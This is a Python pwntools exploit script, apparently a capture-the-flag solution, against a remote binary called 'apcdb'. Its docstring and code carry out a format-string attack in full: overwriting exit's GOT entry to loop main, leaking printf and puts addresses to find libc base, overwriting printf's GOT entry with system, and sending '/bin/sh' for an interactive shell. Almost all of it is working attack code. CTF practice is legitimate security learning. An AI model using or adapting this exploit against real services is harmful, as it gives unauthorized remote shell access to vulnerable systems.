from pwn import *
context.log_level='debug'

"""
This is purely a format string challenge, hence the canary is not important
1) redirecting code execution by overwriting exit() with main() so that the program loops to allow multiple inputs
2) when you use the format string %s it will read the address you overwrite, use that to leak libc
3) overwrite printfgot with system
4) call printf with "/bin/sh" by entering the string as an input which is executed because printf(input) when overwritten with system() will call system(input)
 after printf is overwritten, no prompt will be received because printf() isn't even working anymore so just send the shell string
"""

### DECLARE ###
BINARY = "./apcdb"
URL = "challs.8059blank.ml"
PORT = 1018
FMT_OFFSET = 6
PROMPT = "[+] Contact Lookup: "
MARKER = "for "

### part 1: make program repeat, overwriting exit() ###
elf = context.binary = ELF(BINARY)
rop = ROP(BINARY)
p = remote(URL, PORT)

payload1 = flat(
	fmtstr_payload(FMT_OFFSET, {elf.got['exit']:elf.symbols['main']})
)
p.sendlineafter(PROMPT, payload1)

### part 2: leak libc ###
payload2a = flat(
	f"%{FMT_OFFSET+1}$sAAAA",
	elf.got['printf']
)
p.sendlineafter(PROMPT, payload2a)

p.recvuntil(MARKER)
printf_libc = u64(p.recvuntil('AAAA', drop=True).strip().ljust(8, b"\x00")) # standard
log.success("libc printf is: " + hex(printf_libc))

payload2b = flat(
	f"%{FMT_OFFSET+1}$sAAAA",
	elf.got['puts']
)

p.sendlineafter(PROMPT, payload2b)

p.recvuntil(MARKER)
puts_libc = u64(p.recvuntil('AAAA', drop=True).strip().ljust(8, b"\x00")) # standard
log.success("libc puts is: " + hex(puts_libc))

### part 3: DECLARE libc, overwrite printf with system ###
libc = ELF('./libc6_2.27-3ubuntu1.5_amd64.so')

libc_base = printf_libc - libc.symbols['printf']
log.info("libc base is: " + hex(libc_base))

libc_system = libc_base + libc.symbols['system']
log.info("libc_system is " + hex(libc_system))

payload3 = flat(
	fmtstr_payload(FMT_OFFSET, {elf.got['printf']:libc_system})
)

p.sendlineafter(PROMPT, payload3)
p.sendline("/bin/sh\x00") # call shell

p.interactive()
